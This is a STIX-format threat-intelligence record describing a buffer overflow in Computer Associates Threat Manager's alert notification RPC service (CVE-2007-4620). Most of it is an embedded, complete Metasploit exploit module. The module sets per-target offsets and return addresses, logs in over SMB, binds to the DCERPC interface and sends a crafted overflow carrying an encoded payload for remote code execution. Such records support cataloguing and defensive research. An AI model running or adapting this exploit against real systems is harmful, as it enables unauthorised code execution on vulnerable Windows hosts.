{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--840df3c1-e5ea-49a1-a69f-43441d74ddd3",
    "created": "2024-08-14T16:48:20.455703Z",
    "modified": "2024-08-14T16:48:20.455707Z",
    "name": "Computer Associates Alert Notification Buffer Overflow",
    "description": " This module exploits a buffer overflow in Computer Associates Threat Manager for the Enterprise r8.1 By sending a specially crafted RPC request, an attacker could overflow the buffer and execute arbitrary code. In order to successfully exploit this vulnerability, you will need valid logon credentials to the target. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/etrust_itm_alert.rb",
            "external_id": "etrust_itm_alert.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-4620"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Computer Associates Alert Notification Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Computer Associates Threat Manager for the Enterprise r8.1\n        By sending a specially crafted RPC request, an attacker could overflow the buffer and execute arbitrary code.\n        In order to successfully exploit this vulnerability, you will need valid logon credentials to the target.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-4620' ],\n          [ 'OSVDB', '44040' ],\n          [ 'BID', '28605' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 550,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [ 'Windows 2003 SP0 English',\t{ 'Offset' => 979, 'Ret' => 0x77e03efb } ],\n          [ 'Windows 2000 SP4 English',\t{ 'Offset' => 979, 'Ret' => 0x7c30d043 } ],\n          [ 'CA BrightStor ARCServe Backup 11.5 / Windows 2000 SP4 English', { 'Offset' => 207, 'Ret' => 0x7c2e7993 } ], # Yin Dehui\n        ],\n      'DisclosureDate' => '2008-04-04',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use (alert)\", 'alert']),\n      ])\n  end\n\n  def exploit\n    connect()\n    smb_login()\n\n    handle = dcerpc_handle('3d742890-397c-11cf-9bf1-00805f88cb72', '1.0', 'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"])\n    print_status(\"Binding to #{handle} ...\")\n\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    filler =  rand_text_english(target['Offset']) + [target.ret].pack('V') + make_nops(12)\n    filler << payload.encoded + rand_text_english(772)\n\n    sploit =  NDR.string(rand_text_english(rand(1024) + 1) + \"\\x00\") + NDR.string(filler + \"\\x00\")\n    sploit << NDR.string(rand_text_english(rand(1024) + 1) + \"\\x00\") + NDR.long(0)\n\n    print_status(\"Trying target #{target.name}...\")\n\n      begin\n        dcerpc_call(0x00, sploit)\n        rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      end\n\n    handler\n    disconnect\n  end\nend\n\n=begin\n/*\n * IDL code generated by mIDA v1.0.8\n * Copyright (C) 2006, Tenable Network Security\n * http://cgi.tenablesecurity.com/tenable/mida.php\n *\n *\n * Decompilation information:\n * RPC stub type: inline\n */\n\n[ uuid(3d742890-397c-11cf-9bf1-00805f88cb72), version(1.0) ]\n\ninterface mIDA_interface\n{\ntypedef struct struct_1 {\n  long elem_1;\n  [size_is(10000), length_is(elem_1)] struct struct_2 * elem_2;\n} struct_1 ;\n\ntypedef struct struct_2 {\n  char elem_1[52];\n} struct_2 ;\n\n\n/* opcode: 0x00, address: 0x00401000 */\n\nlong   sub_401000 (\n  [in][ref][string] char * arg_1,\n  [out][ref] struct struct_1 * arg_2,\n  [in][ref][string] char * arg_3\n);\n\n}\n=end\n",
    "x_mitre_disclosure_date": "2008-04-04",
    "x_mitre_platforms": [
        "win'"
    ]
}